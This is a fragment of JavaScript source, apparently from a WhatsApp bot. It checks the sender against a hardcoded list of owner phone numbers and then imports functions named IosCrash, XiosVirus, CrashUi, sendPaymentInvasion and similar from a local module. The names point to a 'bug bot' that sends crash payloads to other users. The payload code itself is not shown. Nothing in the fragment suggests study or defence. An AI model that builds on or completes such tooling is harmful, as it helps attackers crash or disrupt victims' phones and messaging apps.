...
module.exports = async (VxoZap, m, chatUpdate, store) => {
	try {
		...
		const isCreator = ["2349151864541", "2349072958046", "2349031616504", "2348083569647", botNumber, ...kontributor, ...global.owner, creator].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
		...
		//ZNX PLUGIN\\
		const { ZnX, sendPaymentInvasion, Suzo, CaroUsel, Gsz, Tedex, CrL, IosCrash, ZnXIvS, XiosVirus, XiosPay, OutOff, ClPm, ClPmNull, InVisiXz, InVisiLoc, InVisiLocNull, InVisiLocXz, CrashUi } = require("./ZnXIvS/MargaTzy")
